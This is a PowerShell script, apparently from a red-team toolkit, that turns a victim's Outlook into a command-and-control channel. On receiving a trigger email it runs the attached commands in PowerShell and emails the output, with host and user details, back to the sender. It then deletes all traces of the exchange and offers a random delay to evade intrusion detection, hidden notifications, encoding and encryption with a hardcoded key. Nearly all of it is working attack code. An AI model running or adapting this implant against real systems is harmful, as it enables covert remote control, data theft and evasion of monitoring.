<#
.Synopsis
   Monitors outlook for command and control messages & scripts, then executes them and exfils the data.
.DESCRIPTION
   Monitors outlook for a specified email message.  Once recieved, it will read the contents of its attachment, and run it in powershell.  The output will be momentarily saved to the user's temp folder, then emailed back to the sender.
   The script then deletes the temp file, the trigger email, and the sent email.  It also removes both emails from the deleted items folder, before returning to it's listening state.  As outlook is suspicious of .ps1 files, tasking should have a .txt extension.
,NOTES
    Name: Enable-OutlookCC 
    Author: Andrew Cole
    Company: Chiron Technology Services Inc
    DateCreated: 06/15/2015
.EXAMPLE
   Enable-OutlookCC -Triggerwords Task,Order,Transportation -Refresh 5

   This will monitor the users Inbox for a message with a body containing the words Task, Order, and Transportation.  Once detected, the script will run the attached .txt file, and return the results to the senders email, and clean up the evidence.
.EXAMPLE
   Enable-OutlookCC -Junk -Triggerwords Task,Order,Transportation -Refresh 5

   This example does the same as above, but monitors the user's junk folder rather than the inbox.

Modifed by NetSPI: 01/31/2017
.NETSPI MODS
   -4 Trigger words now hardcoded ("NetSPI Detective Controls Test"). Must also include 1 custom trigger, defined by the -TriggerWord switch.
   -Trigger email checking renamed from Delay to Refresh.
   
   New options:
     -Source: Restrict trigger to specific email source (e.g. scott.sutherland@netspi.com)
     -Body: Embeds commands results in the email body
     -Encode: Accepts base64 encoded commands and returns results in base64
     -Encrypt: Encrypts results before sending the email. Key currently hardcoded, but can also be dynamically generated. (https://gist.github.com/ctigeek/2a56648b923d198a6e60)
     -Delay: Inserts a random time delay (between 10 seconds and 7 minutes) between the email trigger and command execution. Hopefully this will throw off some anomaly detection processes.
     -Hidden: Enables "Presentation Mode", disabling Outlook new email notifications (and actually all notifications entirely). This only disables notifications on the host computer (i.e. phones will still receive the new message notice)

#>

function Enable-OutlookCC
{
    [CmdletBinding()]
    Param
    (
        # Listener mode - to be run on target / victim system
        [Parameter(Mandatory=$true, ParameterSetName = "Listener")]
        [switch]$Listen,

        # Emails -must- be sent from this address
        [Parameter(Mandatory=$true,ParameterSetName = "Listener")]
        $Source,

        # Disables all notifications
        [Parameter(Mandatory=$false,ParameterSetName = "Listener")]
        [switch]$Hidden,

        # Inserts a random time delay after receiving the trigger email to aid in IDS evasion
        [Parameter(Mandatory=$false,ParameterSetName = "Listener")]
        [switch]$Delay,

        # Sets the script to monitor the user's junk folder, otherwise, the inbox is monitored
        [Parameter(Mandatory=$false,ParameterSetName = "Listener")]
        [switch]$Junk,

        # Shell mode - to be run on attacking system
        [Parameter(Mandatory=$true, ParameterSetName = "Shell")]
        [switch]$Shell,

        # Initial command
        [Parameter(Mandatory=$false, ParameterSetName = "Shell")]
        $Command,

        # Target email address
        [Parameter(Mandatory=$true, ParameterSetName = "Shell")]
        $Target,

        # The time to wait between mailbox sweeps
        [Parameter(Mandatory=$true)]
        $Refresh,

        # The exact trigger which starts the payload
        [Parameter(Mandatory=$True)]
        $TriggerWord,
   
        # Where to return command output
        [Parameter(Mandatory=$false)]
        [switch]$Body,

        # How to interpret command and results
        [Parameter(Mandatory=$false)]
        [switch]$Encode,

        # Encrypts results before emailing
        [Parameter(Mandatory=$false)]
        [switch]$Encrypt
             
    )
    Begin # Define target folder parameters and determine notification preferences
    { 
        $olFolderSent = 5
        $olFolderDeleted = 3
        if($Junk)
        {
            $olFolderNumber = 23
        }
        else
        {
            $olFolderNumber = 6
        }
        if($Encrypt)
        {
            #$key = Create-AesKey
            $key = "lysXRQIKsKHFy0EuzUmhpfj+++Zyt4Lbv3EMpLVR/7w="
            Write-Verbose "The key is: $key"
        }
    }
    Process 
    {
         While($true)
        {
            if($Hidden)
            {
                Write-Verbose "Disabling all notifications."
                presentationsettings /start
            }
            # Search the Target folder for a trigger email
            $outlook = new-object -com outlook.application;
            $ns = $outlook.GetNameSpace("MAPI");
            write-verbose "Starting mailbox search"
            # Modifying field seperator to fix newline output
            $OFS = "`r`n"
            # Setting environmental variables
            $hostname = $env:COMPUTERNAME
            $domain = $env:USERDOMAIN
            $username = $env:USERNAME
            # Search the desired folder for a trigger email and execute
            $Folder = $ns.GetDefaultFolder($olFolderNumber)
            $Emails = $Folder.items
            $Emails | foreach {             
                if($Shell -and $_.Body -match "NetSPI" -and $_.Body -match "Detective" -and $_.Body -match "Controls" -and $_.Body -match "Test" -and $_.Body -match $Triggerword )
                {                     
                    Write-Verbose "Command output received"
                    $attach = $_.attachments
                    $attach | foreach { $_.saveasfile(("$env:TEMP\~DF1113DF4B1AE98420.TXT")) }
                    switch ($results)
                        {                    
                            $Encode {
                                Write-Verbose "Received encoded results."
                                $received = Get-Content $env:TEMP\~DF1113DF4B1AE98420.TXT
                                $Decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($received))
                                $results = $Decode; break
                                }

                            $Encrypt { 
                                Write-Verbose "Received encrypted results."
                                $received = Get-Content $env:TEMP\~DF1113DF4B1AE98420.TXT
                                $results = Decrypt-String $key $received; break
                                }
                            
                            default {
                                Write-Verbose "Received plain text results."
                                $received = Get-Content $env:TEMP\~DF1113DF4B1AE98420.TXT
                                $results = $received
                                }
                        }
                    $results
                    Remove-Item $env:TEMP\~DF1113DF4B1AE98420.TXT
                    # delete trigger email
                    $_.Delete() 
                    Write-Verbose "Enter your command here"
                    $AttackCommand = Read-Host -Prompt "User@victim.machine:/>"
                    switch ($AttackCommand)
                        {
                            $Encode {
                                $Bytes = [System.Text.Encoding]::Unicode.GetBytes($AttackCommand)
                                $AttackCommand = [Convert]::ToBase64String($Bytes); break
                                }

                            $Encrypt { $AttackCommand = Encrypt-String $key $AttackCommand; break }

                            default {$AttackCommand = $AttackCommand }
                        }
                    Write-Verbose "THE COMMAND YOU SENT WAS: $AttackCommand"
                    $AttackCommand > $env:temp\~DF1113DF4B1AE98421.TXT
                    $file = "$env:temp\~DF1113DF4B1AE98421.TXT"
                    Write-Verbose "Sending command to victim machine..."
                    $mail = $outlook.CreateItem(0)
                    $mail.body = "NetSPI - Detective Controls Test - Command - $Triggerword"
                    $mail.To = "$Target"
                    $null = $mail.attachments.add($file)
                    $mail.Send()
                    Remove-Item $env:temp\~DF1113DF4B1AE98421.TXT
                    Write-Verbose "Command sent"
                    Write-Verbose "Waiting for response..."
                }
                elseif($Listen -and $_.Body -match "NetSPI" -and $_.Body -match "Detective" -and $_.Body -match "Controls" -and $_.Body -match "Test" -and $_.Body -match $Triggerword )
                {
                    Write-Verbose "Trigger email found"
                    $Attacker = $_.SenderEmailAddress
                    $Subject = $_.Subject
                    Write-Verbose "Attacker email is $Attacker and subject is $Subject"
                    $attach = $_.attachments
                    $attach | foreach { $_.saveasfile(("$env:TEMP\~DF1113DF4B1AE98419.TXT")) }
                    $command = Get-Content $env:TEMP\~DF1113DF4B1AE98419.TXT
                    Remove-Item $env:TEMP\~DF1113DF4B1AE98419.TXT
                    # delete trigger email
                    $_.Delete()
                    if($Delay)
                    {
                        $TimeDelay = Get-Random -Maximum 420 -Minimum 10
                        Write-Verbose "Waiting $TimeDelay seconds before proceeding..."
                        Start-Sleep $TimeDelay
                    }
                    switch ($results)
                        {
                            $Encode {
                                Powershell.exe -EncodedCommand $command > $env:temp\~DF1113DF4B1AE98418.TXT
                                $results = Get-Content $env:TEMP\~DF1113DF4B1AE98418.TXT
                                $Bytes = [System.Text.Encoding]::Unicode.GetBytes($results)
                                $results = [Convert]::ToBase64String($Bytes)
                                $results > $env:temp\~DF1113DF4B1AE98418.TXT; break
                                }
                            
                            $Encrypt {
                                Powershell.exe -EncodedCommand $command > $env:temp\~DF1113DF4B1AE98418.TXT
                                $results = Get-Content $env:TEMP\~DF1113DF4B1AE98418.TXT
                                $results = Encrypt-String $key $results
                                $results > $env:temp\~DF1113DF4B1AE98418.TXT; break
                                }
                            
                            default {
                                Powershell.exe -command $command > $env:temp\~DF1113DF4B1AE98418.TXT
                                $results = Get-Content $env:TEMP\~DF1113DF4B1AE98418.TXT
                                }
                        }
                    $file = "$env:temp\~DF1113DF4B1AE98418.TXT"
                    $mail = $outlook.CreateItem(0)
                    $mail.subject = "NetSPI - Detective Controls Test - Results"
                        if($Body)
                        {
                            $mail.body = "NetSPI Detective Controls Test - Results`r`n$Triggerword`r`n`r`n$hostname`r`n$domain\$username`r`n`r`n$command`r`n`r`n$results"
                            $mail.To = "$Attacker"
                            $mail.Send()
                        }
                        else
                        {
                            $mail.body = "NetSPI Detective Controls Test - Results`r`n$Triggerword`r`n`r`n$hostname`r`n$domain\$username`r`n`r`n$command`r`n`r`n"
                            $mail.To = "$Attacker"
                            $mail.attachments.add($file)
                            $mail.Send()
                        }
                    Remove-Item $env:temp\~DF1113DF4B1AE98418.TXT
                    Write-verbose "Commands executed, output returned, cleaning up now"
                    # Delete exfil email from sent items 
                    $sent = $ns.GetDefaultFolder($olfolderSent)
                    $SentEmails = $sent.items
                    $SentEmails | foreach {
                        if($_.subject -match "NetSPI - Detective Controls Test" -and $_.To -match $Attacker) 
                            { $_.Delete() }
                    }
                    Write-verbose "Emails deleted, cleaning deleted items folder now"
                    # Remove trigger and exfil emails from Deleted Items
                    $deleted = $ns.GetDefaultFolder($olFolderDeleted)
                    $DEmails = $deleted.items
                    $DEmails | foreach { 
                        if($_.SenderEmailAddress -match $Attacker -and $_.subject -match $Subject) 
                            { $_.Delete() }
                        elseif($_.subject -match 'NetSPI - Detective Controls Test' -and $_.To -match $Attacker)
                            { $_.Delete() }
                    }
                    Write-verbose "Cleanup complete, returning to monitoring loop"    
                }
            }
            if($Hidden)
            {
                Write-Verbose "Re-enabling all notifications."
                presentationsettings /stop
            }
        Write-Verbose "Trigger email not present, starting sleep cycle of $Refresh seconds"
        start-sleep $Refresh
        }
    }
    End {}
}
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
